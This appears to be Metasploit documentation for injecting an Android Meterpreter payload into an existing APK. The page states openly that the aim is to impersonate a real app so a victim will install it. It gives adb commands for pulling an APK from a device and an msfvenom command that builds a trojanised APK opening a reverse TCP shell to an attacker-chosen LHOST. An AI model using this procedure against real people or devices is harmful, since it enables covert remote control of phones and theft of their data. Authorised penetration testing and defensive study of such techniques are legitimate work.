You can inject the Android Meterpreter into an existing APK using msfvenom. This
will allow you to impersonate an existing application, which may make it easier 
to convince your victim to install the APK.

## Vulnerable Application

It should be possible to inject Meterpreter into any APK, however some applications
have complex resource structures which may not work with `apktool`.
Additionally some applications have security measures that prevent the application
from working as expected once it has been modified.

**Finding APKs**

There are many websites that provide standalone APK that can be downloaded, e.g:
APKPure, APKMirror, RAW APK.
You can also build a simple application yourself with Android Studio.

Additionally you can pull APKs from a device connected via ADB:

```
$ adb shell pm list packages | grep app
package:com.existing.app
$ adb shell pm path com.existing.app
package:/data/app/com.existing.app-1/base.apk
$ adb pull /data/app/com.existing.app-1/base.apk com.existing.apk
[100%] /data/app/com.existing.app-1/base.apk
```

## Requirements
 
APK Injection (as opposed to generating a single APK payload) requires a few tools
to be present on your command line already:

* [Apktool](https://ibotpeaches.github.io/Apktool/) - Used for rebuilding the APK
* [keytool](https://docs.oracle.com/javase/8/docs/technotes/tools/unix/keytool.html) - To create and extract signing certificates
* [jarsigner](https://docs.oracle.com/javase/7/docs/technotes/tools/windows/jarsigner.html) - To re-sign the APK

Installing these tools (if they are not installed already) will depend on your OS.
Apktool can be installed manually or automatically (e.g `brew install apktool`).
keytool and jarsigner can be installed by installing the appropriate JDK.

## Verification Steps

```
./msfvenom -p android/meterpreter/reverse_tcp -x com.existing.apk LHOST=[IP] LPORT=4444 -f raw -o /tmp/android.apk
```

Next, start an Android device. Upload the APK, and execute it, as you would with
a [normal Android meterpreter APK](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/payload/android/meterpreter/reverse_tcp.md).


